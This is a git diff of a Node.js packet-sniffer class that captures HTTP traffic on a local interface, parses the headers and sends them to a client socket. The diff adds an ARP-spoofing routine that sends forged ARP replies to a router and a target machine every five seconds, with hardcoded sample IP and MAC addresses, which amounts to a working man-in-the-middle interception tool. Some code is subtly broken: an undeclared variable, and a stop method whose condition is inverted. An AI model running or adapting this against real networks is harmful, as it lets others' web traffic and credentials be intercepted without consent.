@@ -2,7 +2,7 @@ const pcap = require('pcap')
 const fs = require('fs')
 const pcapFilters = require('./pcap-filters')
 
-class PcapSniffer{
+class PcapSniffer {
 
   constructor () {
     this.name = 'PcapSniffer'
@@ -10,7 +10,9 @@ class PcapSniffer{
     this._if = 'en0'
     this.initComplete = false;
     this._client = null
-    this.mac = "60:03:08:93:6b:ba"
+    this.arpInterval = null
+    // TODO: Make this dynamic
+    // this.mac = "60:03:08:93:6b:ba"
     try{
       this.session = pcap.createSession(this._if, pcapFilters.http)
     }
@@ -19,11 +21,11 @@ class PcapSniffer{
     }
   }
 
-  info (){
+  info (msg){
     console.log(`[${this.name}] : ${msg}`)
   }
 
-  error (){
+  error (msg){
     console.log(`[${this.name} - Err] : ${msg}`)
   }
 
@@ -39,9 +41,6 @@ class PcapSniffer{
     if(this.session && !this.initComplete){
       this.session.on('packet', this._cb.bind(this))
       this.initComplete = true
-      // setInterval(() => {
-      //   this.arpPack()
-      // }, 5000)
     }
     if(this.session === null){
       if(this._client){
@@ -61,19 +60,43 @@ class PcapSniffer{
     this.sniff = false
   }
 
-// src ip  (the node you're describing)
-// src mac
-// target ip : gw (the node youre telling)
-// target mac: gw
+  startArpSpoof (params) {
+    if(!this.arpInterval)
+      this.arpInterval = setInterval(() => {
+        this.arpPack(params.toRouter)
+        this.arpPack(params.toTarget)
+      }, 5000)
+    else{
+      clearInterval(this.arpInterval)
+        this.arpInterval = setInterval(() => {
+        this.arpPack(params.toRouter)
+        this.arpPack(params.toTarget)
+        }, 5000)
+    }
+  }
 
-  arpPack (config = {
-            'op': 'request',
-            'src_ip': '192.168.1.35',
-            'src_mac': 'e4:ce:8f:54:88:06',
-            'dst_ip': '192.168.1.1',
-            'dst_mac': '6c:72:20:6b:89:44'
-            })
+  stopArpSpoof (params) {
+    if(!this.arpInterval){
+      clearInterval(this.arpInterval)
+    }
+  }
+// src ip  (the IP you're targetting )
+// src mac (your OWN mac address)
+// target ip : gw (the node youre telling)
+// target mac: gw (the node youre telling)
+
+  arpPack (config={ src_ip:"192.168.1.35",
+                    src_mac:"60:03:08:93:6b:ba",
+                    target_ip:"192.168.1.1",
+                    target_mac:"6c:72:20:6b:89:44"})
   {
+    pkt_config = {
+            'op': 'request',
+            'src_ip': config.src_ip,
+            'src_mac': config.src_mac,
+            'dst_ip': config.target_ip,
+            'dst_mac': config.target_mac
+            }
 
     let pkt = {};
     pkt.dst = this.mac_to_arr("ff:ff:ff:ff:ff:ff");
@@ -88,10 +111,10 @@ class PcapSniffer{
     pkt.op = [0x00, 0x02];
 
     pkt.src_mac = this.mac_to_arr(this.mac);
-    pkt.src_mac = this.mac_to_arr(config.src_mac);
-    pkt.src_ip = this.ip_to_arr(config.src_ip);
-    pkt.dst_mac = this.mac_to_arr(config.dst_mac);
-    pkt.dst_ip = this.ip_to_arr(config.dst_ip);
+    pkt.src_mac = this.mac_to_arr(pkt_config.src_mac);
+    pkt.src_ip = this.ip_to_arr(pkt_config.src_ip);
+    pkt.dst_mac = this.mac_to_arr(pkt_config.dst_mac);
+    pkt.dst_ip = this.ip_to_arr(pkt_config.dst_ip);
 
     var x;
     var pktArr = [];
@@ -105,18 +128,11 @@ class PcapSniffer{
   }
 
   _cb (raw) {
-    // if(this.sniff){
-
       const packet = pcap.decode.packet(raw)
       const parsed = this._parse(packet)
-      if(this._client){
+      if(this._client && parsed){
         this._client.emit('newPacket', parsed);
       }
-      else{
-        this.error('Client socket not found!')
-      }
-
-    // }
   }
 
   _parse (packet) {
@@ -126,20 +142,31 @@ class PcapSniffer{
     const tcp = ip.payload
     // console.log(ip.saddr, ip.daddr)
     // console.log(eth.dhost, eth.shost)
-    let httpRaw = tcp.data.toString('utf8').split('\r\n')
-    const httpHeaders = httpRaw.filter(function (o) {
-                                      if(o.indexOf(':') > -1 && o.length < 200){
+    let raw = tcp.data.toString('utf-8')
+    if(raw.indexOf('Content-Length') === -1 &&
+        raw.indexOf('Host') === -1 &&
+        raw.indexOf('Content-Type') === -1 ){
+      return false;
+    }
+    let httpRaw = raw.split('\r\n')
+    let httpHeaders = httpRaw.filter(function (o) {
+                                      if( (o.indexOf(':') > -1 ||
+                                           o.indexOf('HTTP') > -1 ||
+                                           o.indexOf('GET') > -1 ||
+                                           o.indexOf('POST') > -1 ) )
+                                      {
                                         return true;
                                       }
                                       else{
                                         return false
                                       }
                                     })
-    // if(httpRaw.length > 20){
-    //   httpRaw = httpRaw.slice(0,20)
-    // }
-    // return  { ts: ts, eth: eth, ip: ip, tcp: tcp, payload: httpHeaders}
-    return  { ts: ts, eth: eth, ip: ip, tcp: tcp, payload: httpRaw }
+
+    if(httpHeaders.length < 1){
+      return false
+    }
+
+    return  { ts: ts, eth: eth, ip: ip, tcp: tcp, payload: httpHeaders}
   }
 
   mac_to_arr(macAddr) {
@@ -163,3 +190,16 @@ class PcapSniffer{
 }
 
 module.exports = PcapSniffer
+
+    // for (var i = 0; i < httpHeaders.length; i++) {
+    //   //;
+
+    //   httpHeaders[i] = httpHeaders[i].replace(/[\x00-\xFF]/, "")//(/[^A-Za-z 0-9 \.,\?""!@#\$%\^&\*\(\)-_=\+;:<>\/\\\|\}\{\[\]`~]*/g, '') ;
+    //   // if(httpHeaders[i].search(/(\\u\d{4})/) > -1){
+    //   //   console.log()
+    //   // }
+    // }
+
+    // console.log(httpHeaders)
+//
+// /[^\000-\031]+/
